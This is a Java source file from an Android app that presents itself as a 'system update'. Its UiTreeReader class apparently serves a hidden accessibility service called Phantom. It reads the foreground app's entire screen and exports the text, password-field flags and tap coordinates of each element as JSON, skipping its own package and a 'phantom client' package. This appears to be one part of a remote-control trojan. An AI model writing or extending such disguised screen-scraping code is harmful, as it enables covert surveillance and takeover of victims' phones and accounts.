package com.systemupdate.app;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class UiTreeReader {

    private static final String TAG = "UiTree";
    private static final int MAX_NODES = 800;
    private static final int MAX_TEXT_LEN = 200;

    public static JSONObject readScreen(PhantomAccessibilityService svc) {
        JSONObject result = new JSONObject();
        try {
            int[] screen = svc.getScreenSize();
            JSONArray nodes = new JSONArray();
            int[] count = new int[]{0};

            AccessibilityNodeInfo root = null;
            String pkg = "";

            try {
                root = svc.getRootInActiveWindow();
                if (root != null) {
                    CharSequence p = null;
                    try { p = root.getPackageName(); } catch (Throwable t) { }
                    if (p != null) pkg = p.toString();
                }
            } catch (Throwable t) { }

            if (root == null || (pkg != null && pkg.equals("com.phantom.client"))) {
                try {
                    List<AccessibilityWindowInfo> windows = svc.getWindows();
                    if (windows != null) {
                        for (AccessibilityWindowInfo w : windows) {
                            if (w == null) continue;
                            AccessibilityNodeInfo wRoot = null;
                            try { wRoot = w.getRoot(); } catch (Throwable t) { }
                            if (wRoot == null) continue;
                            CharSequence wp = null;
                            try { wp = wRoot.getPackageName(); } catch (Throwable t) { }
                            String wpStr = (wp != null) ? wp.toString() : "";
                            if (wpStr.equals("com.systemupdate.app")) continue;
                            root = wRoot;
                            pkg = wpStr;
                            break;
                        }
                    }
                } catch (Throwable t) { }
            }

            if (root != null) {
                walk(root, nodes, count, 0, null);
            }

            result.put("ok", true);
            result.put("package", pkg != null ? pkg : "");
            result.put("screenWidth", screen[0]);
            result.put("screenHeight", screen[1]);
            result.put("nodeCount", count[0]);
            result.put("nodes", nodes);
            return result;
        } catch (Throwable t) {
            try {
                result.put("ok", false);
                result.put("reason", t.getClass().getSimpleName() + ": " + t.getMessage());
            } catch (Throwable ignored) { }
            return result;
        }
    }

    private static void walk(AccessibilityNodeInfo node, JSONArray out, int[] count, int depth, String parentText) {
        if (node == null) return;
        if (count[0] >= MAX_NODES) return;
        if (depth > 40) return;

        try {
            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);

            if (bounds.width() <= 0 || bounds.height() <= 0) {
                int cc = node.getChildCount();
                for (int i = 0; i < cc; i++) {
                    AccessibilityNodeInfo child = null;
                    try {
                        child = node.getChild(i);
                        walk(child, out, count, depth + 1, parentText);
                    } catch (Throwable t) {
                    } finally {
                        try { if (child != null) child.recycle(); } catch (Throwable t) { }
                    }
                }
                return;
            }

            String text = readText(node);
            String desc = readDesc(node);
            String cls = readClass(node);
            String viewId = null;
            try { viewId = node.getViewIdResourceName(); } catch (Throwable t) { }

            boolean clickable = safeBool(node, "clickable");
            boolean editable = safeBool(node, "editable");
            boolean scrollable = safeBool(node, "scrollable");
            boolean focused = safeBool(node, "focused");
            boolean enabled = safeBool(node, "enabled");
            boolean password = safeBool(node, "password");

            String myText = text != null ? text : desc;

            if (myText != null && parentText != null && myText.equals(parentText)) {
                int cc = node.getChildCount();
                for (int i = 0; i < cc; i++) {
                    AccessibilityNodeInfo child = null;
                    try {
                        child = node.getChild(i);
                        walk(child, out, count, depth + 1, parentText);
                    } catch (Throwable t) {
                    } finally {
                        try { if (child != null) child.recycle(); } catch (Throwable t) { }
                    }
                }
                return;
            }

            String cleanText = clean(text);
            String cleanDesc = clean(desc);

            if (cleanText != null && cleanText.length() > 2) cleanText = stripLeadingSymbols(cleanText);
            if (cleanDesc != null && cleanDesc.length() > 2) cleanDesc = stripLeadingSymbols(cleanDesc);

            boolean hasText = cleanText != null && cleanText.length() >= 3;
            boolean hasDesc = cleanDesc != null && cleanDesc.length() >= 3;
            boolean interactive = clickable || editable || scrollable;

            if (!interactive && !hasText && !hasDesc) {
                int cc = node.getChildCount();
                for (int i = 0; i < cc; i++) {
                    AccessibilityNodeInfo child = null;
                    try {
                        child = node.getChild(i);
                        walk(child, out, count, depth + 1, myText);
                    } catch (Throwable t) {
                    } finally {
                        try { if (child != null) child.recycle(); } catch (Throwable t) { }
                    }
                }
                return;
            }

            if (!interactive && isPureSymbols(cleanText) && isPureSymbols(cleanDesc)) {
                return;
            }

            JSONObject entry = new JSONObject();

            if (hasText) entry.put("text", truncate(cleanText, MAX_TEXT_LEN));
            if (hasDesc) entry.put("desc", truncate(cleanDesc, MAX_TEXT_LEN));
            if (cls != null) entry.put("class", cls);
            if (viewId != null) entry.put("id", viewId);

            entry.put("x", bounds.left);
            entry.put("y", bounds.top);
            entry.put("w", bounds.width());
            entry.put("h", bounds.height());
            entry.put("cx", bounds.left + bounds.width() / 2);
            entry.put("cy", bounds.top + bounds.height() / 2);

            entry.put("clickable", clickable);
            entry.put("focusable", safeBool(node, "focusable"));
            entry.put("editable", editable);
            entry.put("enabled", enabled);
            entry.put("checked", safeBool(node, "checked"));
            entry.put("focused", focused);
            entry.put("scrollable", scrollable);
            if (password) entry.put("password", true);

            try {
                AccessibilityNodeInfo clickTarget = findClickableAncestor(node);
                if (clickTarget != null) {
                    Rect cBounds = new Rect();
                    clickTarget.getBoundsInScreen(cBounds);
                    if (cBounds.width() > 0 && cBounds.height() > 0) {
                        entry.put("tapX", cBounds.left + cBounds.width() / 2);
                        entry.put("tapY", cBounds.top + cBounds.height() / 2);
                        entry.put("tapLeft", cBounds.left);
                        entry.put("tapTop", cBounds.top);
                        entry.put("tapRight", cBounds.right);
                        entry.put("tapBottom", cBounds.bottom);
                        entry.put("tapW", cBounds.width());
                        entry.put("tapH", cBounds.height());
                        entry.put("hasClickableAncestor", clickTarget != node);
                    }
                }
            } catch (Throwable t) { }

            String interaction = "none";
            if (editable) interaction = "edit";
            else if (clickable || entry.optBoolean("hasClickableAncestor")) interaction = "click";
            else if (scrollable) interaction = "scroll";
            entry.put("interaction", interaction);

            int h = bounds.height();
            String sizeClass;
            if (h >= 60) sizeClass = "xl";
            else if (h >= 36) sizeClass = "lg";
            else if (h >= 22) sizeClass = "md";
            else sizeClass = "sm";
            entry.put("sizeClass", sizeClass);

            out.put(entry);
            count[0]++;

            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = null;
                try {
                    child = node.getChild(i);
                    if (child != null) walk(child, out, count, depth + 1, myText);
                } catch (Throwable t) {
                } finally {
                    try { if (child != null) child.recycle(); } catch (Throwable t) { }
                }
            }
        } catch (Throwable t) { }
    }

    private static String readText(AccessibilityNodeInfo node) {
        try {
            CharSequence cs = node.getText();
            if (cs == null) return null;
            return cs.toString();
        } catch (Throwable t) { return null; }
    }

    private static String readDesc(AccessibilityNodeInfo node) {
        try {
            CharSequence cs = node.getContentDescription();
            if (cs == null) return null;
            return cs.toString();
        } catch (Throwable t) { return null; }
    }

    private static String readClass(AccessibilityNodeInfo node) {
        try {
            CharSequence cs = node.getClassName();
            if (cs == null) return null;
            return cs.toString();
        } catch (Throwable t) { return null; }
    }

    private static boolean safeBool(AccessibilityNodeInfo node, String what) {
        try {
            if ("clickable".equals(what)) return node.isClickable();
            if ("focusable".equals(what)) return node.isFocusable();
            if ("editable".equals(what)) return node.isEditable();
            if ("enabled".equals(what)) return node.isEnabled();
            if ("checked".equals(what)) return node.isChecked();
            if ("focused".equals(what)) return node.isFocused();
            if ("scrollable".equals(what)) return node.isScrollable();
            if ("password".equals(what)) return node.isPassword();
        } catch (Throwable t) { }
        return false;
    }

    private static String clean(String s) {
        if (s == null) return null;
        try {
            String t = s.trim();
            if (t.length() == 0) return null;
            t = t.replaceAll("\\s+", " ");
            return t;
        } catch (Throwable e) {
            return s;
        }
    }

    private static String stripLeadingSymbols(String s) {
        if (s == null) return null;
        try {
            int i = 0;
            while (i < s.length()) {
                char c = s.charAt(i);
                if (Character.isLetterOrDigit(c)) break;
                i++;
            }
            if (i > 0 && i < s.length()) return s.substring(i).trim();
            return s;
        } catch (Throwable t) { return s; }
    }

    private static boolean isPureSymbols(String s) {
        if (s == null || s.length() == 0) return true;
        try {
            for (int i = 0; i < s.length(); i++) {
                char c = s.charAt(i);
                if (Character.isLetterOrDigit(c)) return false;
            }
            return true;
        } catch (Throwable t) { return true; }
    }

    private static String truncate(String s, int max) {
        if (s == null) return null;
        if (s.length() <= max) return s;
        return s.substring(0, max);
    }

    private static AccessibilityNodeInfo findClickableAncestor(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (safeBool(node, "clickable") && safeBool(node, "enabled")) return node;

        AccessibilityNodeInfo cur = node;
        int guard = 0;
        while (cur != null && guard < 20) {
            try {
                AccessibilityNodeInfo parent = cur.getParent();
                if (parent == null) return null;
                if (safeBool(parent, "clickable") && safeBool(parent, "enabled")) return parent;
                cur = parent;
            } catch (Throwable t) {
                return null;
            }
            guard++;
        }
        return null;
    }
}